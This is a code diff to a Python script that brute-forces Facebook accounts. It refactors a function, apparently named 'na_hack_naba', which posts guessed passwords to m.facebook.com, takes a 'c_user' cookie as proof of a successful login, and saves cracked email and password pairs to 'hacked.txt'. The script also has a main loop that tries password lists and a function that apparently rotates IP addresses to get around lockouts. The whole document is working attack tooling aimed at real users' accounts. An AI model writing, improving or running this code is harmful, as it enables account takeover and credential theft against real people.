@@ -48,7 +48,7 @@ def create_form():
       create_form()
 
 
-def na_hack_naba(email, index, password):
+def na_hack_naba(email,password):
     global BODY, COOKIES
     BODY, COOKIES, URL = create_form()
     BODY['email'] = email
@@ -56,7 +56,7 @@ def na_hack_naba(email, index, password):
     try:
       r = requests.post('https://m.facebook.com{}'.format(str(URL)), data=BODY, cookies=COOKIES, headers=HEADERS)
     except:
-      na_hack_naba(email, index, password)
+      na_hack_naba(email,password)
     try:
       if "c_user" in r.cookies:
         open('hacked.txt', 'a').write(str(email+' | '+password))
@@ -77,7 +77,7 @@ def na_hack_naba(email, index, password):
         print(65 * '\033[1;92m=')
         return True
     except:
-      na_hack_naba(emai, index, password)
+      na_hack_naba(email,password)
     return False
 
 def change_ip():
@@ -135,5 +135,5 @@ if __name__ == "__main__":
           len_pass=0
         len_pass+=1
         print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
-        if na_hack_naba(email, index, password):
+        if na_hack_naba(email,password):
             break
